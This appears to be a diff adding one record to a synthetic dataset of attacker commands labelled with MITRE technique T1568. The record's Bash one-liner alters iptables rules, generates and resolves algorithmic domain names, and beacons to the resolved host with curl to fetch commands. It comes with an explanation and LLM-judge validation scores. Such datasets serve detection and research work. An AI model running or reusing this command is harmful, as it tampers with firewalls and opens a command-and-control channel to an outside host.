@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "bash -c 'resolver=1.1.1.1; iptables -I OUTPUT -p udp --dport 53 -j DROP; iptables -I OUTPUT -p udp -d \"$resolver\" --dport 53 -j ACCEPT; for n in {1..5}; do d=\"$(date -u +%j%n | sha1sum | cut -c1-6)$n.sync-node.info\"; ip=$(dig @${resolver} +short \"$d\" | shuf -n1); [ -n \"$ip\" ] && { port=$(shuf -i 45000-60000 -n1); iptables -I OUTPUT -p tcp -d \"$ip\" --dport \"$port\" -j ACCEPT; iptables -I INPUT -p tcp -s \"$ip\" --sport \"$port\" -j ACCEPT; curl -fsS \"http://$d:$port/cmd?u=$(id -u)\"; break; }; done'",
+  "explanation": "Forces DNS queries to a specific resolver, then cycles through candidate DGA domains until one resolves. It configures iptables for the resolved endpoint and beacons on a random high port.",
+  "rationale_steps": [
+    "Restrict DNS to a chosen resolver using iptables",
+    "Iterate through multiple DGA candidates",
+    "Resolve domain to IP via specified resolver",
+    "Open iptables for that dynamic IP:port",
+    "Initiate C2 command pull via curl"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-10f87baa-ae8ffd12",
+  "source_prompt_hash": "10f87baa",
+  "timestamp_utc": "2025-09-30T09:41:35.067898Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for bash, iptables, dig, and curl commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the Dynamic Resolution technique by using a deterministic algorithm (date+sha1) to generate domain names, resolving them through a specific DNS resolver, and establishing communication on random high ports - exactly matching the T1568 technique description.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:34:12.069731Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, and valid flag formats for all included utilities (bash, iptables, date, sha1sum, cut, dig, shuf, curl, id).",
+        "semantic_score": 3,
+        "semantic_justification": "The command accurately implements DGA domain generation, dynamic resolution, and beaconing, but the critical `iptables` commands, intended to force DNS and open firewall ports, require root privileges and will fail under the stated 'Privilege: None', severely impacting operational feasibility.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:34:22.511352Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The bash one-liner is well-formed with balanced quoting/braces, valid separators, and plausible flags for iptables, dig, shuf, and curl.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates candidate domains, queries a specified resolver, and attempts beaconing to a resolved endpoint on a randomized port consistent with dynamic resolution, but iptables-based DNS forcing/allow rules require root and the random port may not map to a listening service.",
+        "combined_score": 4.5,
+        "confidence": 0.78,
+        "timestamp": "2025-10-02T07:35:16.270711Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
